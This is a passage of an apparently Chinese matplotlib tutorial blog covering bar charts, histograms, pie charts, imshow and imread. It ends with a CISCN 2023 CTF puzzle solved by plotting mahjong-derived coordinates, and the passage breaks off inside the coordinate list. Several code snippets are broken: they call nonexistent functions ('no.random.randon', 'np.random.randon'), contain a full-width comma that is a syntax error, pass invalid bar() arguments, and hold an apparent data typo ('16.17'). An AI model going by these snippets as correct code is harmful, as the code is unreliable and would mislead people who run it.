number">45</span><span class="token punctuation">,</span><span class="token number">56</span><span class="token punctuation">,</span><span class="token number">58</span><span class="token punctuation">,</span><span class="token number">66</span><span class="token punctuation">]</span><span class="token comment">#绘制并列式的条形图</span>plt<span class="token punctuation">.</span>bar<span class="token punctuation">(</span>left<span class="token operator">=</span>index<span class="token punctuation">,</span>height<span class="token operator">=</span>sales_BJ<span class="token punctuation">,</span>colors<span class="token operator">=</span><span class="token string">'red'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>bar<span class="token punctuation">(</span>left<span class="token operator">=</span>index<span class="token operator">+</span>barwidth<span class="token punctuation">,</span>height<span class="token operator">=</span>sales_SH<span class="token punctuation">,</span>colors<span class="token operator">=</span><span class="token string">'blue'</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="直方图"><a class="markdownIt-Anchor" href="#直方图"></a> 直方图</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token comment">#-------绘制单变量直方图-------</span>x<span class="token operator">=</span><span class="token number">100</span><span class="token operator">+</span>no<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randon<span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span>  <span class="token comment">#x是2000个以100为均值的随机数据</span>plt<span class="token punctuation">.</span>hist<span class="token punctuation">(</span>x<span class="token punctuation">,</span>bins<span class="token operator">=</span><span class="token number">10</span>，normed<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>   <span class="token comment">#bins表示共有10个直方块,normed表示是否需要标准化数据</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#-------绘制双变量直方图-------</span>x<span class="token operator">=</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randon<span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">2</span>y<span class="token operator">=</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randon<span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3</span>plt<span class="token punctuation">.</span>hist2d<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>bins<span class="token operator">=</span><span class="token number">40</span><span class="token punctuation">)</span>   <span class="token comment">#用颜色深浅表示频率的大小</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="饼状图"><a class="markdownIt-Anchor" href="#饼状图"></a> 饼状图</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltlabels<span class="token operator">=</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'D'</span>fracs<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">]</span>explode<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0.05</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span>   <span class="token comment">#标签为B的饼块将会离开圆心0.05个距离单位</span>plt<span class="token punctuation">.</span>axes<span class="token punctuation">(</span>aspect<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>   <span class="token comment">#绘制正圆</span>plt<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>x<span class="token operator">=</span>fracs<span class="token punctuation">,</span>labels<span class="token operator">=</span>labels<span class="token punctuation">,</span>autopct<span class="token operator">=</span><span class="token string">'%.0f%%'</span><span class="token punctuation">,</span>explode<span class="token operator">=</span>explode<span class="token punctuation">,</span>shadow<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>  <span class="token comment">#autopct表示数据将会精确到小数点后一位，expolde表示希望着重表示哪一块，shadow表示是否需要添加阴影显得更好看</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="imshow"><a class="markdownIt-Anchor" href="#imshow"></a> imshow（）</h4><p>imshow() 函数是 Matplotlib 库中的一个函数，用于显示图像。</p><p>imshow() 函数常用于绘制二维的灰度图像或彩色图像。</p><p>imshow() 函数可用于绘制矩阵、热力图、地图等。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">imshow<span class="token punctuation">(</span>X<span class="token punctuation">,</span> cmap<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> norm<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> aspect<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> interpolation<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> alpha<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> vmin<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> vmax<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> origin<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> extent<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> shape<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> filternorm<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> filterrad<span class="token operator">=</span><span class="token number">4.0</span><span class="token punctuation">,</span> imlim<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> resample<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> url<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> kwargs<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">绘画矩阵x &#x3D; [[1,2],[3,4]]plt.imshow(x, cmap&#x3D;plt.cm.gray, alpha&#x3D;0.5)plt.text(0, 0, &quot;TP&quot;)plt.text(0, 1, &quot;FP&quot;)plt.text(1, 0, &quot;FN&quot;)plt.text(1, 1, &quot;TN&quot;)plt.xlabel(&quot;prediction&quot;)plt.ylabel(&quot;label&quot;)plt.xticks([0, 1], [&quot;true&quot;, &quot;false&quot;])plt.yticks([0, 1], [&quot;true&quot;, &quot;false&quot;])&#x2F;&#x2F;生成与x的形状相同的方块矩阵，与x的内部值没关系，只与其形状有关系&#x2F;&#x2F;alpha设置透明度<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="imread"><a class="markdownIt-Anchor" href="#imread"></a> imread</h4><p>imread() 方法是 Matplotlib 库中的一个函数，用于从图像文件中读取图像数据。可以裁剪图像，也可以改变图像的颜色。</p><p>imread() 方法返回一个 numpy.ndarray 对象，其形状是 <strong>(nrows, ncols, nchannels)</strong>，表示读取的图像的行数、列数和通道数：</p><ul><li>如果图像是灰度图像，则 nchannels 为 1。</li><li>如果是彩色图像，则 nchannels 为 3 或 4，分别表示红、绿、蓝三个颜色通道和一个 alpha 通道。</li></ul><p>imread() 方法的语法如下：</p><pre class="line-numbers language-none"><code class="language-none">matplotlib.pyplot.imread(fname, format&#x3D;None)fname：指定了要读取的图像文件的文件名或文件路径，可以是相对路径或绝对路径。format ：参数指定了图像文件的格式，如果不指定，则默认根据文件后缀名来自动识别格式。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token comment"># 读取图像文件，下载地址：</span>img <span class="token operator">=</span> plt<span class="token punctuation">.</span>imread<span class="token punctuation">(</span><span class="token string">'map.jpeg'</span><span class="token punctuation">)</span><span class="token comment"># 显示图像</span>plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>img<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ciscn2023的国粹"><a class="markdownIt-Anchor" href="#ciscn2023的国粹"></a> ciscn2023的国粹</h4><p>根据第一张麻将的图片进行从1开始标记，然后以a.png为横坐标，另一个为纵坐标。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">16.17</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token 